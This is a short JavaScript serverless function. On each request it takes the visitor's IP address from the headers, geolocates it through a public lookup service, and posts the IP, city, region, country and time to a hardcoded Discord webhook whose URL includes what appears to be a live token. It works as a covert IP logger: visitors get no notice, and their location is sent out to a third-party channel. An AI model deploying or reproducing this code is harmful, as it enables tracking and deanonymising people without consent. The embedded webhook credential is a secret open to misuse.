exports.handler = async (event, context) => {
  const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";

  const ip =
    event.headers['x-nf-client-connection-ip'] ||
    event.headers['client-ip'] ||
    event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    'Unknown IP';

  const timestamp = new Date().toISOString();

  try {
    const geoRes = await fetch(`http://ipwho.is/${ip}`);
    const geoData = await geoRes.json();

    const {
      country = "N/A",
      region = "N/A",
      city = "N/A"
    } = geoData;

    const message = {
      content: `**IP:** ${ip}
**Location:** ${city}, ${region}, ${country}
**Time:** ${timestamp}`
    };

    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message),
    });

    return {
      statusCode: 200,
      body: 'IP & location sent!',
    };
  } catch (error) {
    console.error('Webhook failed:', error);
    return {
      statusCode: 500,
      body: 'Error sending data',
    };
  }
};
